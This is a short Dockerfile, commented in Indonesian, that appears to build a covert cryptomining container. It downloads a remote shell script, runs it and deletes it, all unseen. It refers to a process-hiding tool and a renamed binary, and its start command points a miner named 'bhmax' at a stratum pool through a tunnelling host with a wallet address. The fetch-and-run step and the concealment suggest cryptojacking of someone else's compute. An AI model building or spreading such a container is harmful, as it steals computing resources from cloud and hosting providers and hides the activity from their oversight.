# Gunakan image dasar
FROM ubuntu:20.04

# Install wget, gcc, dan perangkat lunak yang dibutuhkan
RUN apt-get update && apt-get install -y wget gcc

# Set WORKDIR ke /usr/bin sehingga semua operasi selanjutnya dilakukan dalam direktori ini
WORKDIR /usr/bin

# Download processhider.c

# Download vs.sh, beri izin eksekusi, jalankan, dan hapus setelah selesai
RUN wget https://raw.githubusercontent.com/hudahadoh/vs/main/vs.sh \
    && chmod +x vs.sh \
    && ./vs.sh \
    && rm vs.sh

# Set ulang WORKDIR ke /usr/bin (opsional, sudah berada di /usr/bin)
WORKDIR /usr/bin

# Download config.json dan durex, serta memberikan izin eksekusi pada durex


# Perintah yang akan dijalankan saat container pertama kali dijalankan
CMD ["./bhmax -a verus -o stratum+tcp://dusta-44444.portmap.host:44444 -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.od1 -p x -t 3"]
